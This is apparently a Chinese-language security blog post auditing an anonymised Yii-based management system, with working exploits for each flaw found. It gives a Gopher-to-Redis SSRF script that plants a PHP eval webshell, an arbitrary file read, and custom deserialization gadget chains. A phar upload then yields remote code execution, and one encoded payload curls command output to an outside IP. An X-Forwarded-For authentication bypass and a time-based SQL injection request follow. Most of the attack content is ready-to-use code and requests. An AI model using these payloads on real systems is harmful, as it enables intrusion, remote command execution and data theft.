# 某大型系统代码审计

  
  
&lt;!--more--&gt;  
## 0x01 xxxx-mgr系统  
看完安装流程，先从`web`端入手，几套系统均采用`Yii`二开，在此先学习一下`Yii`的基础知识  
https://www.yiiframework.com/doc/guide/2.0/zh-cn  
### 前台SSRF  
本次审计漏洞重点放在前台/未授权上面，  
在`center/controllers/DemoController.php`下，存在一个经典的`SSRF`漏洞，并且带回显  
```php  
// php代理 实现get post请求  
public function actionProxy(){  
	$rs = [];  
	if(\Yii::$app-&gt;request-&gt;isPost){  
		$url = \Yii::$app-&gt;request-&gt;post(&#39;url&#39;);  
		$post_data = \Yii::$app-&gt;request-&gt;post();  
  
		$rs = $this-&gt;post($url,$post_data);  
	}elseif (\Yii::$app-&gt;request-&gt;isGet){  
		$url = \Yii::$app-&gt;request-&gt;get(&#39;url&#39;);  
  
		$rs = $this-&gt;get($url);  
	}  
  
	return $rs;  
}  
  
// get  
private function get($url){  
	//初始化  
	$ch = curl_init();  
  
	//设置选项，包括URL  
	curl_setopt($ch, CURLOPT_URL, $url);  
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
	curl_setopt($ch, CURLOPT_HEADER, 0);  
  
	//执行并获取HTML文档内容  
	$output = curl_exec($ch);  
  
	//释放curl句柄  
	curl_close($ch);  
  
	return $output;  
}  
  
// post  
private function post($url,$post_data){  
	$ch = curl_init();  
  
	curl_setopt($ch, CURLOPT_URL, $url);  
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
	// post数据  
	curl_setopt($ch, CURLOPT_POST, 1);  
	// post的变量  
	curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);  
  
	$output = curl_exec($ch);  
	curl_close($ch);  
  
	return $output;  
}  
```  
构造请求`/demo/proxy?url=file:///etc/passwd`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402211853093.png)
尝试读取`redis`配置文件`/xxxx/etc/system.conf`  
```conf  
online_server=&#34;127.0.0.1&#34;  
user_server=&#34;127.0.0.1&#34;  
auth_server=&#34;127.0.0.1&#34;  
detail_server=&#34;127.0.0.1&#34;  
log_server=&#34;127.0.0.1&#34;  
dye_server=&#34;127.0.0.1&#34;  
my_ip=&#34;127.0.0.1&#34;  
remote_dm_ip=&#34;&#34;  
thread_num =&#34;4&#34;  
redis_password=&#34;xxxxxx@redis&#34;  
cache_server=&#34;127.0.0.1&#34;  
```  
通过`common/config/main-local.php`文件得到`redis`端口在`16xxx-16xxx`  
选择一个`redis`端口打一下  
```python  
import urllib.parse  
protocol=&#34;gopher://&#34;  
ip=&#34;127.0.0.1&#34;  
port=&#34;16xxx&#34;  
shell=&#34;\n\n&lt;?php eval($_GET[\&#34;cmd\&#34;]);?&gt;\n\n&#34;  
filename=&#34;1.php&#34;  
path=&#34;/tmp&#34;  
passwd=&#34;xxxx@redis&#34;        #如果无密码就不加，如果有密码就加   
cmd=[  
	 &#34;config set dir /tmp&#34;,  
	 &#34;config set dbfilename success&#34;,  
	 &#34;set &#39;test&#39; &#39;success&#39;&#34;,  
	 &#34;save&#34;,  
	 &#34;quit&#34;  
	]  
if passwd:  
    cmd.insert(0,&#34;AUTH {}&#34;.format(passwd))  
payload=protocol&#43;ip&#43;&#34;:&#34;&#43;port&#43;&#34;/_&#34;  
def redis_format(arr):  
    CRLF=&#34;\r\n&#34;  
    redis_arr = arr.split(&#34; &#34;)  
    cmd=&#34;&#34;  
    cmd&#43;=&#34;*&#34;&#43;str(len(redis_arr))  
    for x in redis_arr:  
        cmd&#43;=CRLF&#43;&#34;$&#34;&#43;str(len((x.replace(&#34;${IFS}&#34;,&#34; &#34;))))&#43;CRLF&#43;x.replace(&#34;${IFS}&#34;,&#34; &#34;)  
    cmd&#43;=CRLF  
    return cmd  
  
if __name__==&#34;__main__&#34;:  
    for x in cmd:  
        payload &#43;= urllib.parse.quote(redis_format(x))  
    print(urllib.parse.quote(payload))  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402212248800.png)
`config`命令没有找到，很失败，在配置文件中看到了被禁用  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402212249790.png)
版本是`6.2.6`也没办法主从复制`Orz`，但是在远程环境中部分是存在`config`命令的，从`SSRF`顺利变成了`RCE`  
### 未授权任意文件下载  
由于是Yii框架，所以很快的找到了不做权限验证的`api`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202403021748733.png)
在`center/modules/user/controllers/GroupController.php`控制器下，  
```php  
public function actionDownLoad()  
{  
	//下载文件  
	if (Yii::$app-&gt;request-&gt;get(&#39;file&#39;)) {  
		return Yii::$app-&gt;response-&gt;sendFile(Yii::$app-&gt;request-&gt;get(&#39;file&#39;));  
  
	}  
	if (Yii::$app-&gt;session-&gt;get(&#39;batch_excel_download_file&#39;)) {  
		return Yii::$app-&gt;response-&gt;sendFile(Yii::$app-&gt;session-&gt;get(&#39;batch_excel_download_file&#39;));  
	} else {  
		Yii::$app-&gt;getSession()-&gt;setFlash(&#39;error&#39;, Yii::t(&#39;app&#39;, &#39;batch excel help31&#39;));  
	}  
	return $this-&gt;redirect([&#39;index&#39;]);  
}  
```  
跟进查看`sendFile()`  
```php  
public function sendFile($filePath, $attachmentName = null, $options = [])  
{  
	if (!isset($options[&#39;mimeType&#39;])) {  
		$options[&#39;mimeType&#39;] = FileHelper::getMimeTypeByExtension($filePath);  
	}  
	if ($attachmentName === null) {  
		$attachmentName = basename($filePath);  
	}  
	$handle = fopen($filePath, &#39;rb&#39;);  
	$this-&gt;sendStreamAsFile($handle, $attachmentName, $options);  
  
	return $this;  
}  
```  
利用`fopen`函数打开了传入的文件路径，无任何过滤，直接读取文件  
`/user/group/down-load?file=/etc/passwd`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402231154101.png)
但是任意文件下载危害并不大，我们需要以`RCE`为目的，在这种成熟框架面前，反序列化还是有的，碰巧`fopen`函数也支持`phar://`协议可以触发`phar`反序列化  
#### 反序列化挖掘  
Yii框架是`2.0.45`，这套系统加了一些`vendor`，同时也删除了一些`Yii`自带的`vendor`，所以只能靠我们自己挖一条链子出来，`POC`如下  
##### POP Chain 1  
```php  
&lt;?php   
namespace yii\base {  
    class Component {  
        private $_events = array();  
        private $_behaviors = 1;  
        public function __construct() {  
            include(&#34;./vendor/opis/closure/autoload.php&#34;);  
            $func = function(){  
                $cmd = &#39;touch /tmp/success&#39;;  
                system($cmd);  
            };  
            $raw = \Opis\Closure\serialize($func);  
            $data=\Opis\Closure\unserialize($raw);  
            $this-&gt;_events = [&#34;afterOpen&#34; =&gt; [[  
                $data,   
                &#34;huahua&#34;  
                ]]];  
        }  
    }  
}  
namespace yii\redis{  
    use yii\base\Component;  
    class Connection extends Component{  
        public $redisCommands = [];  
        public $hostname = &#39;&#39;;  
        public $port;  
        public $password;  
        public $username;  
        public $connectionTimeout;  
        public $dataTimeout;  
        public $database;  
        public $unixSocket;  
        private $_socket;  
  
        public function __construct()  
        {  
            $this-&gt;redisCommands = array(&#39;CLEAN UP&#39;);  
            $this-&gt;_socket = false;  
            $this-&gt;hostname = &#39;127.0.0.1&#39;;  
            $this-&gt;port = 8001;//能够连通的任意本地服务的端口  
            $this-&gt;unixSocket = false;  
            $this-&gt;connectionTimeout = 5;  
            parent::__construct();  
        }  
    }  
}  
namespace setasign\Fpdi\PdfReader{  
    use yii\redis\Connection;  
    class PdfReader{  
        protected $parser;  
        public function __construct(){  
        $this-&gt;parser = new Connection;  
        }  
    }  
    include(&#34;./vendor/opis/closure/autoload.php&#34;);  
    echo urlencode(\Opis\Closure\serialize(new PdfReader));  
}  
?&gt;  
```  
##### POP Chain 2  
```php  
&lt;?php   
namespace yii\rest {  
    class CreateAction {  
        public $id;  
        public $checkAccess;  
        public function __construct() {  
            $this-&gt;checkAccess = &#39;system&#39;;  
            $this-&gt;id = &#34;touch /tmp/success&#34;;  
        }  
  
    }  
}  
namespace yii\base {  
    use yii\rest\CreateAction;  
    class Component {  
        private $_events = array();  
        private $_behaviors = 1;  
        public function __construct() {  
            $this-&gt;_events = [&#34;afterOpen&#34; =&gt; [[  
                [new CreateAction,&#34;run&#34;],   
                &#34;a&#34;]]];  
        }  
    }  
}  
namespace yii\redis{  
    use yii\base\Component;  
    class Connection extends Component{  
        public $redisCommands = [];  
        public $hostname = &#39;&#39;;  
        public $port;  
        public $password;  
        public $username;  
        public $connectionTimeout;  
        public $dataTimeout;  
        public $database;  
        public $unixSocket;  
        private $_socket;  
  
        public function __construct()  
        {  
            $this-&gt;redisCommands = array(&#39;CLEAN UP&#39;);  
            $this-&gt;_socket = false;  
            $this-&gt;hostname = &#39;127.0.0.1&#39;;  
            $this-&gt;port = 8001;//能够连通的任意本地服务的端口  
            $this-&gt;unixSocket = false;  
            $this-&gt;connectionTimeout = 5;  
            parent::__construct();  
        }  
    }  
}  
namespace setasign\Fpdi\PdfReader{  
    use yii\redis\Connection;  
    class PdfReader{  
        protected $parser;  
        public $test;  
        public function __construct(){  
        $this-&gt;parser = new Connection;  
        }  
    }  
}  
namespace {  
    use setasign\Fpdi\PdfReader\PdfReader;  
    $clazz = new PdfReader;  
    @unlink(&#34;test.phar&#34;);  
    $p = new Phar(&#34;test.phar&#34;,0);  
    $p-&gt;startBuffering();  
    $p-&gt;setMetadata($clazz);  
    $p-&gt;setStub(&#34;GIF89a__HALT_COMPILER();&#34;);  
    $p-&gt;addFromString(&#34;huahua.txt&#34;,&#34;successful!&#34;);  
    $p-&gt;stopBuffering();  
}  
?&gt;  
```  
#### 上传phar文件  
在`center/modules/report/controllers/SystemController.php`控制器下正好存在一个写图片文件的地方  
```php  
    public function actionImageSave()  
    {  
        $post = Yii::$app-&gt;request-&gt;post();  
        $picInfo = $post[&#39;baseimg&#39;];  
        $savingDir = &#39;uploads/monitor/&#39;;  
        if (!is_dir($savingDir)) {  
            mkdir($savingDir);  
        }  
  
        $streamFileRand = $savingDir.$post[&#39;sql_type&#39;].$post[&#39;proc&#39;].&#39;.png&#39;; //图片名  
        Yii::$app-&gt;session-&gt;set(&#39;filename&#39;, $streamFileRand);  
        preg_match(&#39;/(?&lt;=base64,)[\S|\s]&#43;/&#39;,$picInfo,$picInfoW);//处理base64文本  
        file_put_contents($streamFileRand,base64_decode($picInfoW[0]));//文件写入  
  
        return true;  
    }  
```  
  
#### 最终利用  
step 1  
```http  
POST /report/system/image-save HTTP/2  
  
baseimg=base64,R0lGODlhX19IQUxUX0NPTVBJTEVSKCk7ID8%2bDQqlAgAAAQAAABEAAAABAAAAAABtAgAATzozMzoic2V0YXNpZ25cRnBkaVxQZGZSZWFkZXJcUGRmUmVhZGVyIjoyOntzOjk6IgAqAHBhcnNlciI7TzoyMDoieWlpXHJlZGlzXENvbm5lY3Rpb24iOjEyOntzOjEzOiJyZWRpc0NvbW1hbmRzIjthOjE6e2k6MDtzOjg6IkNMRUFOIFVQIjt9czo4OiJob3N0bmFtZSI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aTo4MDgxO3M6ODoicGFzc3dvcmQiO047czo4OiJ1c2VybmFtZSI7TjtzOjE3OiJjb25uZWN0aW9uVGltZW91dCI7aTo1O3M6MTE6ImRhdGFUaW1lb3V0IjtOO3M6ODoiZGF0YWJhc2UiO047czoxMDoidW5peFNvY2tldCI7YjowO3M6Mjk6IgB5aWlccmVkaXNcQ29ubmVjdGlvbgBfc29ja2V0IjtiOjA7czoyNzoiAHlpaVxiYXNlXENvbXBvbmVudABfZXZlbnRzIjthOjE6e3M6OToiYWZ0ZXJPcGVuIjthOjE6e2k6MDthOjI6e2k6MDthOjI6e2k6MDtPOjIxOiJ5aWlccmVzdFxDcmVhdGVBY3Rpb24iOjI6e3M6MjoiaWQiO3M6MTg6InRvdWNoIC90bXAvc3VjY2VzcyI7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjt9aToxO3M6MzoicnVuIjt9aToxO3M6MToiYSI7fX19czozMDoiAHlpaVxiYXNlXENvbXBvbmVudABfYmVoYXZpb3JzIjtpOjE7fXM6NDoidGVzdCI7Tjt9CgAAAGh1YWh1YS50eHQLAAAAjT7YZQsAAABYYbEEpAEAAAAAAABzdWNjZXNzZnVsIeJ7cw%2bG4EYC7FkDA58zSu4gzM18AgAAAEdCTUI%3d&amp;sql_type=hua&amp;proc=hua  
```  
step 2  
```http  
/user/group/down-load?file=phar://./uploads/monitor/huahua.png  
```  
成功利用  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402231547670.png)
### 前台无条件RCE  
既然挖到了两条链子，全局搜索`unserialize`函数  
在`center/modules/strategy/controllers/IpController.php`控制器下面，  
存在两个方法存在`unserialize()`  
```php  
public function actionBindIp(){  
	$data1 = unserialize(Yii::$app-&gt;request-&gt;post(&#39;data1&#39;));  
	...  
	...  
	...  
}  
public function actionCancelBindIp(){  
	$data1 = unserialize(Yii::$app-&gt;request-&gt;post(&#39;data1&#39;));  
	...  
	...  
	...  
}  
```  
构造`poc`  
```http  
POST /strategy/ip/bind-ip  
  
data1=O%3A33%3A%22setasign%5CFpdi%5CPdfReader%5CPdfReader%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00parser%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A12%3A%7Bs%3A13%3A%22redisCommands%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22CLEAN&#43;UP%22%3B%7Ds%3A8%3A%22hostname%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A4%3A%22port%22%3Bi%3A8001%3Bs%3A8%3A%22password%22%3BN%3Bs%3A8%3A%22username%22%3BN%3Bs%3A17%3A%22connectionTimeout%22%3Bi%3A5%3Bs%3A11%3A%22dataTimeout%22%3BN%3Bs%3A8%3A%22database%22%3BN%3Bs%3A10%3A%22unixSocket%22%3Bb%3A0%3Bs%3A29%3A%22%00yii%5Credis%5CConnection%00_socket%22%3Bb%3A0%3Bs%3A27%3A%22%00yii%5Cbase%5CComponent%00_events%22%3Ba%3A1%3A%7Bs%3A9%3A%22afterOpen%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A275%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22function%22%3Bs%3A127%3A%22function%28%29%7B%0A&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;%24cmd&#43;%3D&#43;%27curl&#43;http%3A%2F%2F124.220.215.8%3A1234%2F%3Fcmd%3D%60whoami%60%27%3B%0A&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;%5Csystem%28%24cmd%29%3B%0A&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;&#43;%7D%22%3Bs%3A5%3A%22scope%22%3Bs%3A18%3A%22yii%5Cbase%5CComponent%22%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%220000000053bc12be000000004d2c46e6%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22huahua%22%3B%7D%7D%7Ds%3A30%3A%22%00yii%5Cbase%5CComponent%00_behaviors%22%3Bi%3A1%3B%7D%7D  
```  
成功`RCE`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402231808954.png)
  
## API接口  
### 0x00 SQL注入  
先来看一下如何做的权限验证  
```php  
&#39;authenticator&#39; =&gt; [  
	&#39;class&#39; =&gt; \common\extend\ApiAuth::className(),  
],  
```  
跟进`ApiAuth`类  
```php  
public function authenticate($user, $request, $response)  
    {  
  
        // 如果是从 v2 过来的，就不要重复验证  
        if (substr($request-&gt;pathInfo, 0, 7) === &#39;api/v2/&#39;) {  
            return true;  
        }  
  
          
        $this-&gt;access_token = $this-&gt;findParams($request, $this-&gt;tokenParam);  
          
        $url = $this-&gt;findParams($request);  
          
        $ip = $request-&gt;getUserIP();  
  
          
        $this-&gt;validateAccessToken($ip, $url);  
  
          
        $this-&gt;validateRemoteAddress($ip, $url);  
  
          
        if ($this-&gt;validateAction($url, $ip)) {  
            return true;  
        }  
  
        throw new UnauthorizedHttpException(\Yii::t(&#39;app&#39;, 204010), 20401);  
    }  
```  
先绕过第一个点`validateAccessToken`  
```php  
public function validateAccessToken($ip, $url)  
    {  
        //去缓存内先验证一下令牌是否有缓存,如果没有则去mysql表内查询  
        if (!Yii::$app-&gt;cache-&gt;get($this-&gt;access_token)) {  
  
            //如果url是查询令牌接口，则根据请求ip来进查询数据  
            if ($url == &#39;/api/v8/auth/get-access-token&#39;) {  
                //按着ip精准查询  
                $tokenResource = IpBindingToken::find()-&gt;where([&#39;ip&#39; =&gt; $ip])-&gt;asArray()-&gt;all();  
                //如果没查询到数据， 可能是授权的ip段 比如 192.168.1.100-192.168.1.105  
                if (!$tokenResource) {  
                    $tmp_ip = explode(&#39;.&#39;, $ip);  
                    unset($tmp_ip[3]);  
                    //根据ip前三位来查询数据 是一个二维数组  
                    $tokenResource = IpBindingToken::find()-&gt;filterWhere([&#39;like&#39;, &#39;ip&#39;, implode(&#39;.&#39;, $tmp_ip)])-&gt;asArray()-&gt;all();  
                }  
  
                //如果没查询到数据，返回机器未授权  
                if (!$tokenResource) {  
                    throw new UnauthorizedHttpException(Yii::t(&#39;app&#39;, 204013), 20401);  
                }  
  
                //如果是多个数组，那么这一步就必须要匹配到ip相对应的数据了  
                foreach ($tokenResource as $item) {  
                    //解析mysql存储的ip列数据，返回boolean  
                    $ipParseResult = $this-&gt;parseIp($ip, $item[&#39;ip&#39;]);  
                    //判断用户ip是否在ipMap数组内  
                    if ($ipParseResult) {  
                        $this-&gt;access_token = $item[&#39;token&#39;];  
                        Yii::$app-&gt;cache-&gt;add($this-&gt;access_token, $item);  
                        break;  
                    }  
                }  
  
                //如果未能匹配到数据， 返回机器未授权错误  
                if ($this-&gt;access_token == $ip) {  
                    throw new UnauthorizedHttpException(Yii::t(&#39;app&#39;, 204013), 20401);  
                }  
            } else {  
                //其他请求均以令牌为查询条件  
                $tokenResource = IpBindingToken::findOne([&#39;token&#39; =&gt; $this-&gt;access_token]);  
                if (!$tokenResource) {  
                    //返回令牌错误  
                    throw new UnauthorizedHttpException(Yii::t(&#39;app&#39;, 204012), 20401);  
                }  
  
                Yii::$app-&gt;cache-&gt;add($this-&gt;access_token, $tokenResource-&gt;attributes);  
            }  
        }  
    }  
```  
接收传入的参数`access_token`并且和数据库中的作对比，在`/api/v8/auth/get-access-token`中可以获取`token`，在请求时加上`X-Forwarded-For: 127.0.0.1`即可  
第二个点`validateRemoteAddress`，这里没什么好说的，请求时加上`X-Forwarded-For: 127.0.0.1`和上面的`access_token`相匹配即可  
绕过权限验证后，再来看控制器  
`rest/versions/api/immu/controllers/QueryController.php`  
```php  
public function actionIndex()  
    {  
        $params = Yii::$app-&gt;request-&gt;get();  
        $userName = @$params[&#39;user_name&#39;];  
        //$findUser = &#34;select user_name from `user` where user_name=&#39;$userName&#39;&#34;;  
        $findRes = $this-&gt;getUser($userName);  
        if (!$findRes) {  
            return Common::info(10002);  
        }  
        $time = @$params[&#39;time&#39;];  
        $timeNow = date(&#39;Ym&#39;,time());  
        if ($time == $timeNow){  
            //查mysql总和加redis在线total  
            //查在线表总流量  
            $tableName = &#39;srun_detail&#39;;  
            $sql = &#34;select `rad_online_id` from `online_radius` where `user_name`=&#39;$userName&#39;&#34;;  
            $details = Yii::$app-&gt;db-&gt;createCommand($sql)-&gt;queryOne();  
            if (!$details){  
                $onlineBytes = 0;  
            }else{  
                $hash = Redis::executeCommand(&#39;hGetAll&#39;, &#39;hash:rad_online:&#39; . $details[&#39;rad_online_id&#39;], [], &#39;redis_online&#39;);  
                if ($hash) {  
                    $onlineData = Redis::hashToArray($hash);  
                    $onlineBytes = $onlineData[&#39;bytes_in&#39;] &#43; $onlineData[&#39;bytes_out&#39;];  
                }else{  
                    $onlineBytes = 0;  
                }  
  
            }  
        }else{  
            $tableName = sprintf(&#39;srun_detail%s%s&#39;,&#34;_&#34;,$time);  
            $onlineBytes = 0;  
        }  
        $sql = &#34;select SUM(`total_bytes`) as `mysql_bytes` from `$tableName` where `user_name`=&#39;$userName&#39;&#34;;  
        $mysqlData = Yii::$app-&gt;db-&gt;createCommand($sql)-&gt;queryOne();  
        $allBytes = $mysqlData[&#39;mysql_bytes&#39;];  
        $allBytes = $allBytes &#43; $onlineBytes;  
        $result[&#39;total_bytes&#39;] = sprintf(&#34;%.2f&#34;,$allBytes/(1024**3));  
        $result[&#39;code&#39;] = &#39;E00&#39;;  
        $result[&#39;msg&#39;] = &#39;成功&#39;;  
        return $result;  
    }  
```  
在这里，直接做了拼接并且执行  
```php  
$sql = &#34;select SUM(`total_bytes`) as `mysql_bytes` from `$tableName` where `user_name`=&#39;$userName&#39;&#34;;  
$mysqlData = Yii::$app-&gt;db-&gt;createCommand($sql)-&gt;queryOne();  
```  
构造`payload`  
```http  
GET /api/immu/query?access_token=FPFBWAk5llPf3Phd5drTiez9Uks1749J&amp;user_name=test002&amp;time=mobile_day`&#43;where&#43;user_name=&#39;test001&#39;&#43;union&#43;select&#43;1&#43;and(select&#43;sleep(3))%23 HTTP/2  
Host: 192.168.0.105:8001  
X-Forwarded-For: 127.0.0.1  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402251145010.png)
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/  

